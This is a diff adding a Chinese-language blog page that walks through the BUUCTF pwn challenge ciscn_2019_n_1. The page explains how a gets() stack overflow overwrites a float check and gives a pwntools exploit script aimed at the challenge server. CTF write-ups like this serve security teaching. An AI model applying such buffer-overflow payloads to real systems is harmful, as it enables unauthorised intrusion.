@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Ciscn_2019_n_1 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Ciscn_2019_n_1</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/02/07</h2>
+</div>
+
+<main>
+<h1 id="ciscn_2019_n_1">ciscn_2019_n_1</h1>
+<p>checksec检查</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207131806307.png" alt="image-20200207131806307"></p>
+<p>64位程序开启NX</p>
+<p>运行一下看看功能</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207131847240.png" alt="image-20200207131847240"></p>
+<p>等待输入，有个tips：11.28125</p>
+<p>拖入ida分析</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207132151820.png" alt="image-20200207132151820"></p>
+<p>main()函数调用func()函数</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207132124090.png" alt="image-20200207132124090"></p>
+<p>看到gets()未做限制明显栈溢出，if判断成功执行cat flag</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207132549732.png" alt="image-20200207132549732"></p>
+<p>变量v1和v2处在同一个栈上，偏移0x30-0x4</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207132504515.png" alt="image-20200207132504515"></p>
+<p>思路：使用gets()通过v1覆盖v2为11.28125，从而满足if判断执行cat flag</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207133124150.png" alt="image-20200207133124150"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207133040893.png" alt="image-20200207133040893"></p>
+<p>查看11.28125在程序中的表示为0x41348000</p>
+<p>编写exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#！/usr/bin/env python</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">27485</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x30</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x41348000</span>)
+<span style="color:#75715e">#这里不能直接使用p64(11.28125),转换出来与程序中的0X41348000不符，会导致if判断不成功</span>
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Let</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s guess the number.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200207134230277.png" alt="image-20200207134230277"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
